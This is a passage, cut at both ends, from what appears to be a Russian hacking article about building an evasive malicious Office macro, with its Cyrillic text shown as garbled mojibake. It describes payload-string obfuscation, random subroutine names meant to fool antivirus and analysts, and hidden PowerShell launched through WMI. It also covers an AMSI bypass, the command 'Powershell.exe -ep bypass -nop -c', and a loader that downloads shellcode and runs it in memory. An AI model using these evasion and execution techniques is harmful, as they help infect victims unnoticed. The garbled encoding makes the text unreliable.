—Å–∏–º–≤–æ–ª—å–Ω—ã–π –º–∞—Å—Å–∏–≤. –ó–∞—Ç–µ–º –¥–µ—Å—è—Ç–∏—á–Ω–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –∫–∞–∂–¥–æ–≥–æ —Å–∏–º–≤–æ–ª–∞ —Å—É–º–º–∏—Ä—É–µ—Ç—Å—è —Å–æ –∑–Ω–∞—á–µ–Ω–∏–µ–º 26. –î–∞–ª–µ–µ –æ–Ω –∑–∞–±–∏–ª —Å–∏–º–≤–æ–ª –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–º–∏ –Ω—É–ª—è–º–∏, —á—Ç–æ–±—ã –ø–æ–∑–∂–µ, –≤ –ø—Ä–æ—Ü–µ—Å—Å–µ –¥–µ–æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏ VBA, –ø–æ–ª—É—á–∏–ª–∏—Å—å –ø—Ä–µ–¥—Å–∫–∞–∑—É–µ–º—ã–µ 3-—Å–∏–º–≤–æ–ª—å–Ω—ã–µ –∑–Ω–∞—á–µ–Ω–∏—è. –ï—Å–ª–∏ –¥–ª–∏–Ω–∞ –≤—ã–≤–æ–¥–∞ —Å–æ—Å—Ç–∞–≤–ª—è–µ—Ç 1 —Å–∏–º–≤–æ–ª, —Ç–æ –∫ –Ω–µ–º—É –¥–æ–±–∞–≤–ª—è–µ—Ç—Å—è –¥–≤–∞ –Ω—É–ª—è, –µ—Å–ª–∏ –¥–ª–∏–Ω–∞ ‚Äì –¥–≤–∞ —Å–∏–º–≤–æ–ª–∞, –¥–æ–±–∞–≤–ª—è–µ—Ç—Å—è –æ–¥–∏–Ω –Ω–æ–ª—å, –∞ –µ—Å–ª–∏ —Ç—Ä–∏ —Å–∏–º–≤–æ–ª–∞, –Ω–∏—á–µ–≥–æ –Ω–µ –¥–æ–±–∞–≤–ª—è–µ—Ç—Å—è.<br />
<br />
–¢–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º —Ñ–æ—Ä–º–∏—Ä—É–µ—Ç—Å—è –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω–∞—è –≤—ã—Ö–æ–¥–Ω–∞—è —Å—Ç—Ä–æ–∫–∞, –∫–æ—Ç–æ—Ä–∞—è –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç—Å—è –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞ —á–µ—Ä–µ–∑ –∫–æ–Ω–≤–µ–π–µ—Ä. –ü–æ—Å–ª–µ –∑–∞–ø—É—Å–∫–∞ —Å–∫—Ä–∏–ø—Ç–∞ –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞ –ø–æ–º–µ—â–∞–µ—Ç—Å—è —Å—Ç—Ä–æ–∫–∞ –ø—Ä–∏–º–µ—Ä–Ω–æ —Å–ª–µ–¥—É—é—â–µ–≥–æ —Å–æ–¥–µ—Ä–∂–∞–Ω–∏—è.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="13.png"
		data-src="/proxy.php?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26887%2F13.png&amp;hash=000ebad637be58907a2d94519f3a382f" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../135e6a.png?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26887%2F13.png&amp;hash=000ebad637be58907a2d94519f3a382f"
			data-url="../../../static.xakep.ru/images/5566915d365e8669c6db764c9400b737/26887/13.png"
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="13.png"
			title=""
			width="" height="" loading="lazy" />
	</div><br />
<br />
–î–µ–æ–±—Ñ—É—Å—Ü–∏—Ä—É—é—â–∏–π –º–∞–∫—Ä–æ—Å –≤ VBA –≤—ã–≥–ª—è–¥–∏—Ç –ø—Ä–∏–º–µ—Ä–Ω–æ —Ç–∞–∫.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="14.png"
		data-src="/proxy.php?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26888%2F14.png&amp;hash=7bb47f8295e224a177868ebe6df75b95" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../148828.png?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26888%2F14.png&amp;hash=7bb47f8295e224a177868ebe6df75b95"
			data-url="../../../static.xakep.ru/images/5566915d365e8669c6db764c9400b737/26888/14.png"
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="14.png"
			title=""
			width="" height="" loading="lazy" />
	</div><br />
<br />
–í —Å–∫—Ä–∏–ø—Ç–µ —Å–æ–∑–¥–∞—é—Ç—Å—è –ø–æ–¥–ø—Ä–æ–≥—Ä–∞–º–º—ã —Å–æ —Å–ª—É—á–∞–π–Ω—ã–º–∏ –∏–º–µ–Ω–∞–º–∏, –∫–æ—Ç–æ—Ä—ã–µ –Ω–µ –≤—ã–¥–∞–¥—É—Ç –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–Ω–æ–º—É —Å–∫–∞–Ω–µ—Ä—É, —á—Ç–æ –ø—Ä–æ—Ü–µ–¥—É—Ä–∞ –º–æ–∂–µ—Ç –±—ã—Ç—å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–π, –∞ —Ç–∞–∫–∂–µ –∑–∞–ø—É—Ç–∞—é—Ç –ª—é–±–æ–≥–æ –∞–Ω–∞–ª–∏—Ç–∏–∫–∞, –∫–æ—Ç–æ—Ä–æ–º—É –ø–æ–ø–∞–¥–µ—Ç –≤ —Ä—É–∫–∏ —Ç–∞–∫–æ–π –º–∞–∫—Ä–æ—Å. –í VBA –ø–æ–¥–ø—Ä–æ–≥—Ä–∞–º–º–∞ –≤—ã–∑—ã–≤–∞–µ—Ç—Å—è –ø—Ä–∏ –ø–æ–º–æ—â–∏ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏, –∫–æ—Ç–æ—Ä–∞—è –∏–º–µ–µ—Ç –ø—Ä–∏–º–µ—Ä–Ω–æ —Å–ª–µ–¥—É—é—â–∏–π –≤–∏–¥.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="15.png"
		data-src="/proxy.php?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26889%2F15.png&amp;hash=bcf6f96fea0f1365eb9d703848c9ab07" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../15c280.png?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26889%2F15.png&amp;hash=bcf6f96fea0f1365eb9d703848c9ab07"
			data-url="../../../static.xakep.ru/images/5566915d365e8669c6db764c9400b737/26889/15.png"
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="15.png"
			title=""
			width="" height="" loading="lazy" />
	</div><br />
<br />
<br />
–°–Ω–∞—á–∞–ª–∞ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω–∞—è –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –ø–æ—Å—Ç—É–ø–∞–µ—Ç –≤ –ø–æ–¥–ø—Ä–æ–≥—Ä–∞–º–º—É Joy –∏ –∑–∞–ø—É—Å–∫–∞–µ—Ç —Ü–∏–∫–ª Do While. –ó–∞—Ç–µ–º –æ–Ω–∞ –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç—Å—è –≤ –ø–æ–¥–ø—Ä–æ–≥—Ä–∞–º–º—É Man, –∏–∑–≤–ª–µ–∫–∞—é—â—É—é –ø–µ—Ä–≤—ã–µ 3 —á–∏—Å–ª–∞ (–≤–æ—Ç –∑–∞—á–µ–º –ø–æ–Ω–∞–¥–æ–±–∏–ª–æ—Å—å –∑–∞–ø–æ–ª–Ω–µ–Ω–∏–µ –Ω—É–ª—è–º–∏), –ø–æ—Å–ª–µ —á–µ–≥–æ –ø–µ—Ä–µ–¥–∞–µ—Ç —ç—Ç–∏ —Å–∏–º–≤–æ–ª—ã —Ñ—É–Ω–∫—Ü–∏–∏ bread. –û–Ω–∞ –≤—ã—á—Ç–µ—Ç 26 –∏–∑ 3 —Å–∏–º–≤–æ–ª–æ–≤, —á—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–µ –¥–µ—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω–æ–µ —á–∏—Å–ª–æ. –≠—Ç–æ —á–∏—Å–ª–æ —è–≤–ª—è–µ—Ç—Å—è ASCII-—ç–∫–≤–∏–≤–∞–ª–µ–Ω—Ç–æ–º —Å–∏–º–≤–æ–ª–∞ –∏ —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç—Å—è –≤ –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π green.<br />
<br />
–î–∞–ª–µ–µ –≤—Å—è –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω–∞—è –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç—Å—è —Ñ—É–Ω–∫—Ü–∏–∏ rand, –∫–æ—Ç–æ—Ä–∞—è —É–¥–∞–ª—è–µ—Ç –∏–∑ –Ω–µ–µ –ø–µ—Ä–≤—ã–µ —Ç—Ä–∏ —Å–∏–º–≤–æ–ª–∞ –∏ —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç –∏—Ö –æ–±—Ä–∞—Ç–Ω–æ –≤ –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é paper. –ó–∞—Ç–µ–º –ø—Ä–æ—Ü–µ—Å—Å –ø–æ–≤—Ç–æ—Ä—è–µ—Ç—Å—è –¥–æ —Ç–µ—Ö –ø–æ—Ä, –ø–æ–∫–∞ –≤—Å—è –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –Ω–µ —Ä–µ–¥—É—Ü–∏—Ä—É–µ—Ç—Å—è –¥–æ –Ω—É–ª—è.<br />
<br />
–ù–∞–∫–æ–Ω–µ—Ü, –¥–µ—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω–∞—è –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç—Å—è –≤—ã–∑—ã–≤–∞—é—â–µ–π –ø—Ä–æ—Ü–µ–¥—É—Ä–µ –ø—Ä–∏ –ø–æ–º–æ—â–∏ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ Joy = green.<br />
<br />
<b>–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ PowerShell –ø—Ä–∏ –ø–æ–º–æ—â–∏ WMI</b><br />
<br />
–î–∞–ª–µ–µ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –∑–∞–ø—É—Å—Ç–∏—Ç—å —ç–∫–∑–µ–º–ø–ª—è—Ä –ø—Ä–æ—Ü–µ—Å—Å–∞ PowerShell –ø—Ä–∏ –ø–æ–º–æ—â–∏ WMI. –î–ª—è —ç—Ç–æ–≥–æ —Å–æ–∑–¥–∞–µ—Ç—Å—è –æ–±—ä–µ–∫—Ç WMI –ø–æ—Å—Ä–µ–¥—Å—Ç–≤–æ–º –≤—ã–∑–æ–≤–∞ —Ñ—É–Ω–∫—Ü–∏–∏ VBA GetObject —Å –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω–æ–π —Å—Ç—Ä–æ–∫–æ–π winmgmts:, —Ä–µ–∑—É–ª—å—Ç–∞—Ç —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç—Å—è –≤ –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π ObjWMIService.<br />
<br />
–ü–æ—Å–ª–µ —ç—Ç–æ–≥–æ –≤—ã–∑—ã–≤–∞–µ—Ç—Å—è —Ñ—É–Ω–∫—Ü–∏—è Get –∏–∑ –æ–±—ä–µ–∫—Ç–∞ WMI Service —Å –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω–æ–π –≤–µ—Ä—Å–∏–µ–π —Å—Ç—Ä–æ–∫–∏ Win32_ProcessStartup –∏ —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç—Å—è –≤ –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é objStartup. –≠—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç –∑–∞–¥–∞—Ç—å –ø–∞—Ä–∞–º–µ—Ç—Ä—ã –∑–∞–ø—É—Å–∫–∞ –¥–ª—è —Å–æ–∑–¥–∞–≤–∞–µ–º–æ–≥–æ —Å–∫—Ä–∏–ø—Ç–æ–º –ø—Ä–æ—Ü–µ—Å—Å–∞ PowerShell. –°–ª–µ–¥—É—é—â–∏–µ –¥–µ–π—Å—Ç–≤–∏—è –Ω–∞–ø—Ä–∞–≤–ª–µ–Ω—ã –Ω–∞ —Ç–æ, —á—Ç–æ–±—ã —Å–ø—Ä—è—Ç–∞—Ç—å –æ–∫–Ω–æ PowerShell (–¥–ª—è —ç—Ç–æ–≥–æ –∑–Ω–∞—á–µ–Ω–∏–µ –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π objConfig.showWindow —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç—Å—è –≤ 0) ‚Äî –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –¥–∞–∂–µ –Ω–µ —É–∑–Ω–∞–µ—Ç, —á—Ç–æ –≤ —Ñ–æ–Ω–æ–≤–æ–º —Ä–µ–∂–∏–º–µ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –∫–∞–∫–æ–π‚Äë—Ç–æ —Å–∫—Ä–∏–ø—Ç.<br />
<br />
–°–æ–∑–¥–∞–Ω–Ω–æ–º—É –ø—Ä–æ—Ü–µ—Å—Å—É –ø–µ—Ä–µ–¥–∞—é—Ç—Å—è –∑–∞—Ä–∞–Ω–µ–µ —Å—Ñ–æ—Ä–º–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã –∏ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –≤ –≤–∏–¥–µ –Ω–µ—Å–∫–æ–ª—å–∫–∏—Ö —Å—Ü–µ–ø–ª–µ–Ω–Ω—ã—Ö —Å—Ç—Ä–æ–∫. –í–µ—Å—å —Ö–æ–¥ —Å–æ–∑–¥–∞–Ω–∏—è –æ–±—ä–µ–∫—Ç–∞ WMIObject –≤—ã–≥–ª—è–¥–∏—Ç –ø—Ä–∏–º–µ—Ä–Ω–æ —Ç–∞–∫.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ PowerShell –ø—Ä–∏ –ø–æ–º–æ—â–∏ WMI"
		data-src="/proxy.php?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26890%2F16.png&amp;hash=920bdfbe13910975e240d443a5a507c6" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../162d0b.png?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26890%2F16.png&amp;hash=920bdfbe13910975e240d443a5a507c6"
			data-url="../../../static.xakep.ru/images/5566915d365e8669c6db764c9400b737/26890/16.png"
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ PowerShell –ø—Ä–∏ –ø–æ–º–æ—â–∏ WMI"
			title="–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ PowerShell –ø—Ä–∏ –ø–æ–º–æ—â–∏ WMI"
			width="" height="" loading="lazy" />
	</div><br />
<br />
<b>–ü–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ PowerShell</b><br />
<br />
–ü—Ä–µ–∂–¥–µ —á–µ–º –∑–∞–ø—É—Å—Ç–∏—Ç—å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—É—é –∫–æ–º–∞–Ω–¥—É PowerShell, –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –æ—Ç–∫–ª—é—á–∏—Ç—å AMSI. –ü–æ—Å–∫–æ–ª—å–∫—É –∏–Ω—Å—Ç–∞–Ω—Å PowerShell –ø–æ—Ä–æ–∂–¥–∞–µ—Ç—Å—è –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ, –∑–¥–µ—Å—å –≤–æ–∑–Ω–∏–∫–∞–µ—Ç –∑–∞–≥–≤–æ–∑–¥–∫–∞ —Å –µ—â–µ –æ–¥–Ω–∏–º —Å–ª—É—á–∞–µ–º –∏–Ω—Ç–µ–≥—Ä–∞—Ü–∏–∏ AMSI, –∫–æ—Ç–æ—Ä—ã–π –ø—Ä–∏–¥–µ—Ç—Å—è –æ–±–æ–π—Ç–∏ –ø—Ä–µ–∂–¥–µ, —á–µ–º —Å–∫—Ä–∏–ø—Ç –Ω–∞—á–Ω–µ—Ç –∫–∞–∫—É—é‚Äë–ª–∏–±–æ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—É—é –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å.<br />
<br />
–†–∞–±–æ—Ç–∞ –º–∞–∫—Ä–æ—Å–∞ –Ω–∞—á–∏–Ω–∞–µ—Ç—Å—è —Å –æ—Ç–∫–ª—é—á–µ–Ω–∏—è AMSI –≤ VBA, —á—Ç–æ–±—ã –≤–æ –≤—Ä–µ–º—è –∏—Å–ø–æ–ª–Ω–µ–Ω–∏—è —Å–∏—Å—Ç–µ–º–∞ –Ω–µ –ø–æ–º–µ—Ç–∏–ª–∞ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –º–∞–∫—Ä–æ—Å–∞ –∫–∞–∫ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–µ.<br />
<br />
–î–ª—è —ç—Ç–æ–≥–æ –æ–±—ä—è–≤–ª—è—é—Ç—Å—è —Ç—Ä–∏ —Ä–∞–∑–Ω—ã–µ —Å—Ç—Ä–æ–∫–∏ ‚Äî  str1,str2 –∏ str3, –∞ –∑–∞—Ç–µ–º –∏–º –ø–µ—Ä–µ–¥–∞–µ—Ç—Å—è –≤ –∫–∞—á–µ—Å—Ç–≤–µ –∑–Ω–∞—á–µ–Ω–∏—è –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞, –∫–æ—Ç–æ—Ä—É—é –Ω—É–∂–Ω–æ –ø—Ä–æ–≥–Ω–∞—Ç—å —á–µ—Ä–µ–∑ –æ–±—ä–µ–∫—Ç WMI (–ø—Ä–æ—Ü–µ—Å—Å —Å–æ–∑–¥–∞–Ω–∏—è —ç—Ç–æ–≥–æ –æ–±—ä–µ–∫—Ç–∞ –±—ã–ª –æ–ø–∏—Å–∞–Ω –≤—ã—à–µ). –≠—Ç–æ —Å–¥–µ–ª–∞–Ω–æ —Ä–∞–¥–∏ —É–¥–æ–±–æ—á–∏—Ç–∞–µ–º–æ—Å—Ç–∏ –∏ –ø—Ä–∏–≥–æ–¥–Ω–æ—Å—Ç–∏ –∫ –æ—Ç–ª–∞–¥–∫–µ: —Ä–∞–∑–¥–µ–ª–∏–≤ –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É –Ω–∞ —Ñ—Ä–∞–≥–º–µ–Ω—Ç—ã, –º–æ–∂–Ω–æ –≤—ã—è–≤–∏—Ç—å, –≥–¥–µ –∏–º–µ–Ω–Ω–æ –æ–Ω–∞ –ø—Ä–µ–∫—Ä–∞—â–∞–µ—Ç –≤—ã–ø–æ–ª–Ω—è—Ç—å—Å—è.<br />
<br />
–ü–µ—Ä–≤–∞—è —Å—Ç—Ä–æ–∫–∞ (str1) –ø–æ–ª—É—á–∞–µ—Ç –≤ –∫–∞—á–µ—Å—Ç–≤–µ –Ω–∞–≥—Ä—É–∑–∫–∏ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—É—é –≤–µ—Ä—Å–∏—é –∫–æ–¥–∞:<br />
<br />
<i>Powershell.exe -ep bypass -nop -c</i><br />
<br />
–ï—Å–ª–∏ –Ω–µ —É–¥–∞–µ—Ç—Å—è —Å–æ–∑–¥–∞—Ç—å –ø—Ä–æ—Ü–µ—Å—Å PowerShell –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –º–∞–∫—Ä–æ—Å–∞, —Ç–æ —É–∂–µ –∏–∑–≤–µ—Å—Ç–Ω–æ, —á—Ç–æ –ø—Ä–æ–±–ª–µ–º–∞ –∑–∞–∫–ª—é—á–∞–µ—Ç—Å—è –≤ –ø–µ—Ä–≤–æ–º –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω–æ–º —Ñ—Ä–∞–≥–º–µ–Ω—Ç–µ.<br />
<br />
–í—Ç–æ—Ä–∞—è —Å—Ç—Ä–æ–∫–∞ (str2) –ø–æ–ª—É—á–∞–µ—Ç –≤ –∫–∞—á–µ—Å—Ç–≤–µ –Ω–∞–≥—Ä—É–∑–∫–∏ —Å–ª–µ–¥—É—é—â–∏–π –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã–π –∫–æ–¥:<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746796137996.png"
		data-src="https://osint42.org/attachments/1746796137996-png.322/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746796137996-png.322/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746796137996.png"
			title="1746796137996.png"
			width="1158" height="142" loading="lazy" />
	</div><br />
<br />
–≠—Ç–∞ —Å—Ç—Ä–æ–∫–∞ ‚Äì –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã–π –æ–±—Ö–æ–¥ AMSI. –®–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–æ –ø–æ –æ—Å–Ω–æ–≤–∞–Ω–∏—é 64, —Ç–∞–∫ –∫–∞–∫ –ø—Ä–∏ –ø–µ—Ä–µ–≤–æ–¥–µ —Å VBA –Ω–∞ PowerShell –º–æ–≥—É—Ç –≤–æ–∑–Ω–∏–∫–Ω—É—Ç—å –ø—Ä–æ–±–ª–µ–º—ã –ø—Ä–∏ –ø–µ—Ä–µ–¥–∞—á–µ —Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã—Ö —Å–∏–º–≤–æ–ª–æ–≤. –í –¥–µ–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–Ω–æ–º –≤–∏–¥–µ –æ–±—Ö–æ–¥ —É–∫–ª–∞–¥—ã–≤–∞–µ—Ç—Å—è –≤ –æ–¥–Ω—É —Å—Ç—Ä–æ–∫—É, –∞ –≤ –Ω–µ—Å–≤–µ—Ä–Ω—É—Ç–æ–º –≤—ã–≥–ª—è–¥–∏—Ç –ø—Ä–∏–º–µ—Ä–Ω–æ —Ç–∞–∫.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="17.png"
		data-src="/proxy.php?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26891%2F17.png&amp;hash=4a2bb0da39bad46e9a143ae65593355e" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../1749e9.png?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26891%2F17.png&amp;hash=4a2bb0da39bad46e9a143ae65593355e"
			data-url="../../../static.xakep.ru/images/5566915d365e8669c6db764c9400b737/26891/17.png"
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="17.png"
			title=""
			width="" height="" loading="lazy" />
	</div><br />
<br />
–ï—Å–ª–∏ –±—É–¥–µ—Ç –ø–æ–ª—É—á–µ–Ω–æ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ Microsoft Defender –æ –±–ª–æ–∫–∏—Ä–æ–≤–∫–µ —Å–∫—Ä–∏–ø—Ç–∞ –Ω–∞ –¥–∞–Ω–Ω–æ–º —ç—Ç–∞–ø–µ, —Å—Ç–∞–Ω–µ—Ç –æ—á–µ–≤–∏–¥–Ω–æ, —á—Ç–æ –æ–±—Ö–æ–¥ –Ω–µ —É–¥–∞–ª—Å—è. –ï—Å–ª–∏ –Ω–µ —É–¥–∞—Å—Ç—Å—è —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ —Å –≤–µ–±‚Äë—Å–µ—Ä–≤–µ—Ä–æ–º –¥–ª—è —Å–∫–∞—á–∏–≤–∞–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏, –Ω–æ —Å–∞–º —Å–∫—Ä–∏–ø—Ç PowerShell –∑–∞–ø—É—Å—Ç–∏—Ç—Å—è —É—Å–ø–µ—à–Ω–æ, —ç—Ç–æ —Ç–∞–∫–∂–µ –±—É–¥–µ—Ç –æ–∑–Ω–∞—á–∞—Ç—å, —á—Ç–æ –ø—Ä–æ–±–ª–µ–º–∞ –≤–æ–∑–Ω–∏–∫–ª–∞ –∏–º–µ–Ω–Ω–æ –∑–¥–µ—Å—å.<br />
<br />
–¢—Ä–µ—Ç—å—è —Å—Ç—Ä–æ–∫–∞ (str3) –ø–æ–ª—É—á–∞–µ—Ç –≤ –∫–∞—á–µ—Å—Ç–≤–µ –Ω–∞–≥—Ä—É–∑–∫–∏ —Ç–∞–∫–æ–π –∫–æ–¥:<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746796149158.png"
		data-src="https://osint42.org/attachments/1746796149158-png.323/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746796149158-png.323/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746796149158.png"
			title="1746796149158.png"
			width="512" height="50" loading="lazy" />
	</div><br />
<br />
–¢–∞–∫ –∏–∑–≤–ª–µ–∫–∞–µ—Ç—Å—è –ø–µ—Ä–≤–∞—è —á–∞—Å—Ç—å –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏, –∑–∞–≥—Ä—É–∑—á–∏–∫ —à–µ–ª–ª‚Äë–∫–æ–¥–∞, –∫–æ—Ç–æ—Ä—ã–π –±—É–¥–µ—Ç –∑–∞–≥—Ä—É–∂–∞—Ç—å –±–∞–π—Ç‚Äë–∫–æ–¥ —Å–æ —Å—Ç–∞–¥–∏–∏ 2 –∏ –≤—ã–ø–æ–ª–Ω—è—Ç—å –µ–≥–æ –Ω–µ–ø–æ—Å—Ä–µ–¥—Å—Ç–≤–µ–Ω–Ω–æ –≤ –ø–∞–º—è—Ç–∏.<br />
<br />
<b>–ó–∞–≥—Ä—É–∑—á–∏–∫ —à–µ–ª–ª-–∫–æ–¥–∞</b><br />
<br />
–ü–æ—Å–ª–µ –∑–∞–ø—É—Å–∫–∞ –∏–∑ PowerShell —Å–∫—Ä–∏–ø—Ç —Å–∫–∞—á–∏–≤–∞–µ—Ç —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã–π —à–µ–ª–ª‚Äë–∫–æ–¥, –∞ –∑–∞—Ç–µ–º, –≤–æ—Å–ø–æ–ª—å–∑–æ–≤–∞–≤—à–∏—Å—å —Ä–µ—Ñ–ª–µ–∫—Å–∏–µ–π, –∑–∞–≥—Ä—É–∂–∞–µ—Ç —Ñ—É–Ω–∫—Ü–∏–∏ Windows API, —ç–∫–≤–∏–≤–∞–ª–µ–Ω—Ç–Ω—ã–µ VirtualAlloc, CreateThread –∏ WaitForSingleObject.<br />
<br />
–°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã–π —à–µ–ª–ª‚Äë–∫–æ–¥ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –∑–∞–≥—Ä—É–∂–µ–Ω–Ω—ã–µ API Windows, —á—Ç–æ–±—ã –≤—ã–ø–æ–ª–Ω–∏—Ç—å –∫–æ–¥ –≤ —Ç–µ–∫—É—â–µ–º –ø—Ä–æ—Ü–µ—Å—Å–µ PowerShell. –≠—Ç–æ –∏ –Ω–∞–∑—ã–≤–∞–µ—Ç—Å—è —Ä–µ—Ñ–ª–µ–∫—Å–∏–µ–π, –≤ —Ö–æ–¥–µ –Ω–µ–µ —Ñ—É–Ω–∫—Ü–∏–∏ —Å–æ–∑–¥–∞—é—Ç—Å—è –∏ –∑–∞–≥—Ä—É–∂–∞—é—Ç—Å—è –≤ –ø–∞–º—è—Ç—å. –ï—Å—Ç—å –ø—Ä–∏—á–∏–Ω–∞, –ø–æ –∫–æ—Ç–æ—Ä–æ–π –Ω—É–∂–Ω–æ –¥–µ–π—Å—Ç–≤–æ–≤–∞—Ç—å –∏–º–µ–Ω–Ω–æ —Ç–∞–∫, –∞ –Ω–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å, –Ω–∞–ø—Ä–∏–º–µ—Ä, <a 